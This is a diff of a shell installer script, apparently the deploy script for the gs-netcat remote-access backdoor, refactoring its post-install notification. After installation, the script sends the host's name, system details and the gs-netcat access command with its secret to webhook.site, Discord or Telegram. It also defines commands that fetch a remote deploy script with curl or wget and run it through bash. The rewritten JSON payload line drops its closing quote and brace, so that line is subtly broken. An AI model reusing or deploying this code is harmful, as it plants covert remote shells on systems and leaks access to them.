@@ -160,13 +160,7 @@ unset URL_BASE_CDN URL_BASE_X
 
 # WEBHOOKS are executed after a successful install
 # shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
-GS_EXTRA_ARGS=()
-[[ -n $GS_HOST ]] && GS_EXTRA_ARGS+=(" GS_HOST=$GS_HOST")
-
-GS_EXTRA_OPTIONS=()
-[[ -n $GS_BEACON ]] && GS_EXTRA_OPTIONS+=("-w")
-
-msg='$(hostname) --- $(uname -rom)${GS_EXTRA_ARGS:+ ---${GS_EXTRA_ARGS[*]}} gs-netcat -i -s ${GS_SECRET} ${GS_EXTRA_OPTIONS}'
+msg='$(hostname) --- $(uname -rom) --- ${GS_HOST:+GS_HOST=${GS_HOST} }gs-netcat -i -s ${GS_SECRET}${GS_BEACON:+ -w}'
 ### Telegram
 # GS_TG_TOKEN="5794110125:AAFDNb..."
 # GS_TG_CHATID="-8834838..."
@@ -183,7 +177,7 @@ msg='$(hostname) --- $(uname -rom)${GS_EXTRA_ARGS:+ ---${GS_EXTRA_ARGS[*]}} gs-n
 # GS_WEBHOOK_KEY="dc3c1af9-ea3d-4401-9158-eb6dda735276"
 [[ -n $GS_WEBHOOK_KEY ]] && {
 	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
-	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "${GS_EXTRA_ARGS:+${GS_EXTRA_ARGS[*]}} gs-netcat -i -s ${GS_SECRET} ${GS_EXTRA_OPTIONS}"}'
+	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "${GS_HOST:+GS_HOST=${GS_HOST} }gs-netcat -i -s ${GS_SECRET}${GS_BEACON:+ -w}'
 	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
 	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
 }
@@ -194,8 +188,7 @@ msg='$(hostname) --- $(uname -rom)${GS_EXTRA_ARGS:+ ---${GS_EXTRA_ARGS[*]}} gs-n
 	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
 	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
 }
-unset data
-unset msg
+unset data msg
 
 DL_CRL="bash -c \"\$(curl -fsSL $GS_URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO-  $GS_URL_DEPLOY)\""
